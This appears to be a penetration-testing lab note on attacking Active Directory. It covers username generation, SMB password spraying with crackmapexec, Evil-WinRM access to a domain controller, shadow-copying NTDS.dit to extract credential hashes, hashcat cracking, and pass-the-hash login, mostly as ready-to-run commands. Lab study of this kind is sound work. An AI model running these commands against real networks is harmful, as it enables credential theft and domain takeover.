# Attacking Active Directory & NTDS.dit

## Basic Information

### Common username convention

| Username Convention                 | Practical Example for Jane Jill Doe |
| ----------------------------------- | ----------------------------------- |
| `firstinitiallastname`              | jdoe                                |
| `firstinitialmiddleinitiallastname` | jjdoe                               |
| `firstnamelastname`                 | janedoe                             |
| `firstname.lastname`                | jane.doe                            |
| `lastname.firstname`                | doe.jane                            |
| `nickname`                          | doedoehacksstuff                    |

> The best way to know is to find a username somewhere in other services. This will give us the username format eg. jdoe@example.com.

After finding all the names possible in the company's website, image metadata, databases, etc. This might be a complicated job for us to convert those names into the convention (if there are no emails found.)

To solve such problem, there are few tools that help automate the username formating task such as [Username Anarchy](https://github.com/urbanadventurer/username-anarchy)&#x20;

We can run it on the list of names found

```shell-session
./username-anarchy -i /home/ltnbob/names.txt 
```

or we could specify the format

```
./username-anarchy --input-file ./test-names.txt  --select-format first.last
```

### **CrackMapExec**

Using the credentials generated we can try to brute froce the smb share using the usernames and common passwords

```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p /usr/share/wordlists/fasttrack.txt
```

> Note That: this could potentially lock out the account if the setting is configured to lock out multiple faild attemps. However, the setting is not set by default, so the chances of it being misconfigured is there.

## Capturing NTDS.dit

### Method 1&#x20;

#### **Connecting to a DC with Evil-WinRM**

We can connect to a target DC using the credentials we captured.

```shell-session
carbonlky@htb[/htb]$ evil-winrm -i 10.129.201.57  -u bwilliamson -p 'P@55w0rd!'
```

**Checking Local Group Membership and User Account Privileges including Domain**

```shell-session
*Evil-WinRM* PS C:\> net localgroup
*Evil-WinRM* PS C:\> net user bwilliamson
```

> To make a copy of the NTDS.dit file, we need local admin (`Administrators group`) or Domain Admin (`Domain Admins group`) (or equivalent) rights.

**Creating Shadow Copy of C: and Copying NTDS.dit from the VSS**

```shell-session
*Evil-WinRM* PS C:\> vssadmin CREATE SHADOW /For=C:
*Evil-WinRM* PS C:\NTDS> cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

Then transfer the NTDS.dit to our attack machine.

### Method 2

**Using cme to Capture NTDS.dit**

```shell-session
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

## Captured NTDS.dit

### Crack the hash

```shell-session
sudo hashcat -m 1000 64f12cddaa88057e06a81b54e73b949b /usr/share/wordlists/rockyou.txt
```

if the hash couldn't be cracked consider using PtH vulnerability

### Pass-the-Hash

`Pass-the-Hash` (`PtH`). A PtH attack takes advantage of the [NTLM authentication protocol](https://docs.microsoft.com/en-us/windows/win32/secauthn/microsoft-ntlm) to authenticate a user using a password hash. Instead of `username`:`clear-text password` as the format for login, we can instead use `username`:`password hash`

eg.

```shell-session
evil-winrm -i 10.129.201.57  -u  Administrator -H "64f12cddaa88057e06a81b54e73b949b"
```
